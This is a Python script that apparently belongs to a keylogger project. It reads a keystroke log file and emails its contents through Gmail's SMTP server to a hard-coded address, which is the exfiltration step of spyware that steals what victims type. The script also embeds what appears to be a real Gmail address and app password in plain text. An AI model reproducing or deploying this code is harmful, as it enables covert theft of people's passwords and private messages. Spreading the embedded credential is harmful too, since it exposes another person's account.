import smtplib
import ssl
import datetime
from email.message import EmailMessage
t1 = datetime.datetime.now()
t1=str(t1.strftime("%x"))
t2 = datetime.datetime.now()
t2=str(t2.strftime("%X"))
now=str(t2 +" " +t1)
# Define email sender and receiver
#For the password, enable 2 step verification and get an "App Password"
#and place it for the variable email_pas
email_sender = 'virabyanhrant@gmail.com'
email_password = 'paddrqhputixaajr'
receiver = ["virabyanhrant@gmail.com"]


with open('Keylogger\logs\log.txt', 'r') as file:
    data = file.read()


# Set the subject and body of the email
subject = "Log (" + now + ")"
body = data

em = EmailMessage()
em['From'] = email_sender
em['To'] = receiver
em['Subject'] = subject
em.set_content(body)

# Add SSL (layer of security)
context = ssl.create_default_context()

# Log in and send the email
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
  smtp.login(email_sender, email_password)
  smtp.sendmail(email_sender, receiver, em.as_string())
